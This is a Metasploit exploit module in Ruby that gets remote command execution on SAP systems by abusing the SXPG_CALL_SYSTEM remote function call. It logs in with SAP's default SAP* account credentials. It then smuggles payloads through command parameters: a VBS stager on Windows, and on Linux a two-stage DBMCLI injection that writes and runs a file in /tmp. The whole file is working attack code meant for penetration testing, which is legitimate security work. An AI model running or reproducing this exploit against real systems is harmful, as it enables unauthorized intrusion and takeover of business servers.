##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

##
# This module is based on, inspired by, or is a port of a plugin available in
# the Onapsis Bizploit Opensource ERP Penetration Testing framework -
# http://www.onapsis.com/research-free-solutions.php.
# Mariano Nunez (the author of the Bizploit framework) helped me in my efforts
# in producing the Metasploit modules and was happy to share his knowledge and
# experience - a very cool guy.
#
# The following guys from ERP-SCAN deserve credit for their contributions -
# Alexandr Polyakov, Alexey Sintsov, Alexey Tyurin, Dmitry Chastukhin and
# Dmitry Evdokimov.
#
# I'd also like to thank Chris John Riley, Ian de Villiers and Joris van de Vis
# who have Beta tested the modules and provided excellent feedback. Some people
# just seem to enjoy hacking SAP :)
##

require 'msf/core'
require 'rubygems'
begin
  require 'nwrfc'
rescue LoadError
  abort("[-] This module requires the NW RFC SDK ruby wrapper (http://rubygems.org/gems/nwrfc) from Martin Ceronio.")
end

class Metasploit4 < Msf::Exploit::Remote

  Rank = GreatRanking

  include Msf::Exploit::CmdStagerVBS
  include Msf::Exploit::EXE
  include NWRFC

  def initialize
    super(
      'Name'           => 'SAP RFC SXPG_CALL_SYSTEM Remote Command Execution',
      'Description'    => %q{
                              This module makes use of the SXPG_CALL_SYSTEM Remote Function Call to execute OS commands as configured in SM69.
                              The module requires the NW RFC SDK from SAP as well as the Ruby wrapper nwrfc (http://rubygems.org/gems/nwrfc). 
                            },                 
      'References'     => [[ 'URL', 'http://labs.mwrinfosecurity.com' ]],
      'Platform'       => ['win', 'unix'],
      'Targets' => [
        [ 'Linux',
          {
            'Arch'     => ARCH_CMD,
            'Platform' => 'unix'
          }
        ],
        [ 'Windows x64',
          {
            'Arch' => ARCH_X86_64,
            'Platform' => 'win'
          }
        ]
      ],
      'DefaultTarget' => 0,
      'Privileged' => false,
      'Author' => [ 'nmonkee' ],
      'License' => MSF_LICENSE
       )

    register_options(
      [
        Opt::RPORT(3300),
        OptString.new('USERNAME', [true, 'Username', 'SAP*']),
        OptString.new('PASSWORD', [true, 'Password', '06071992']),
        OptString.new('CLIENT', [true, 'Client', '001']),
        OptString.new('SRHOST', [false, 'SAP Router Address', nil]),
        OptString.new('SRPORT', [false, 'SAP Router Port Number', nil]),
        OptString.new('COMMAND', [true, 'Command Name as in SM69', 'DBMCLI']),
        OptString.new('OS', [true, 'Operating System 1. ANYOS, 2. UNIX, 3. Windows NT, 4. AS/400, 5. OS/400', '2'])
      ], self.class)

    register_advanced_options(
      [
        OptInt.new('PAYLOAD_SPLIT', [true, 'Size of payload segments', '250']),
      ], self.class)
  end

   def exploit
    if target.name =~ /Windows/
      linemax = datastore['PAYLOAD_SPLIT']
      vprint_status("[SAP] #{datastore['rhost']}:#{datastore['rport']} - Using custom payload size of #{linemax}") if linemax != 250
      print_status("[SAP] #{datastore['rhost']}:#{datastore['rport']} - Sending RFC request")
      execute_cmdstager({ :delay => 0.35, :linemax => linemax })
    elsif target.name =~ /Linux/
      file = rand_text_alphanumeric(5)
      stage_one = create_unix_payload(1,file)
      print_status("[SAP] #{datastore['rhost']}:#{datastore['rport']} - Dumping the payload to /tmp/#{file}...")
      send_payload(stage_one)
      stage_two = create_unix_payload(2,file)
      print_status("[SAP] #{datastore['rhost']}:#{datastore['rport']} - Executing /tmp/#{file}...")
      send_payload(stage_two)
    end
  end

  def create_unix_payload(stage, file)
    command = ""
    if target.name =~ /Linux/
      if stage == 1
        cmd = payload.encoded.gsub(" ","\t")
        command = "-o /tmp/" + file + " -n pwnie" + "\n!"
        command << cmd + "&"
        command << "\n"
      elsif stage == 2
        command = "-ic /tmp/" + file
      end
    end
    return command.to_s
  end

  def execute_command(cmd,opts)
    send_payload(cmd)
  end

  def send_payload(cmd)
    rport = datastore['rport'].to_s.split('')
    sysnr = rport[2]
    sysnr << rport[3]
    client = datastore['CLIENT'] if datastore['CLIENT'] =~ /^\d{3}\z/
    conn = auth(datastore['rhost'],datastore['rport'],sysnr)
    exec(datastore['rhost'],datastore['rport'],conn,cmd)
  end

  def exec(ip, rport, conn, cmd)
    begin
      conn_info = conn.connection_info
      function = conn.get_function("SXPG_CALL_SYSTEM")
      fc = function.get_function_call

      if target.name =~ /Linux/
        fc[:COMMANDNAME] = "DBMCLI"
        fc[:ADDITIONAL_PARAMETERS] = cmd
      elsif target.name =~ /Windows/
        fc[:COMMANDNAME] = datastore['COMMAND']
        fc[:ADDITIONAL_PARAMETERS] = " & #{cmd.strip}"
      end
      fc.invoke
      conn.disconnect
    rescue NWError => e
      print_error("[SAP] #{ip}:#{rport} - FunctionCallException - code: #{e.code} group: #{e.group} message: #{e.message} type: #{e.type} number: #{e.number}")
      fail_with(Exploit::Failure::Unknown, "[SAP] #{ip}:#{rport} - Error injecting command")
      return
    end
  end

  def auth(ip,rport,sysnr)
    ashost = ip
    ashost = "/H/#{datastore['SRHOST']}/H/#{ip}" if datastore['SRHOST']
    auth_hash = {"user" => datastore['USERNAME'], "passwd" => datastore['PASSWORD'], "client" => datastore['CLIENT'], "ashost" => ashost, "sysnr" => sysnr}
    begin
      conn = Connection.new(auth_hash)
      return conn
    rescue NWError => e
      case e.message.to_s
      when /Name or password is incorrect/
        print_error("[SAP] #{ip}:#{rport} - login failed}") 
      when /not available in this system/
        print_error("[SAP] #{ip}:#{rport} - client #{client} does not exist")
      when /Connection refused/
        print_error("[SAP] #{ip}:#{rport} - communication failure (refused)")
      when /No route to host/
        print_error("[SAP] #{ip}:#{rport} - communication failure (unreachable)")
      when /unknown/
        print_error("[SAP] #{ip}:#{rport} - communication failure (hostname unknown)")
      when /Password logon no longer possible - too many failed attempts/
        print_error("[SAP] #{ip}:#{rport} - user locked")
      when /Password must be changed/
        print_error("[SAP] #{ip}:#{rport} - password must be changed")
      end
    end
  end
end
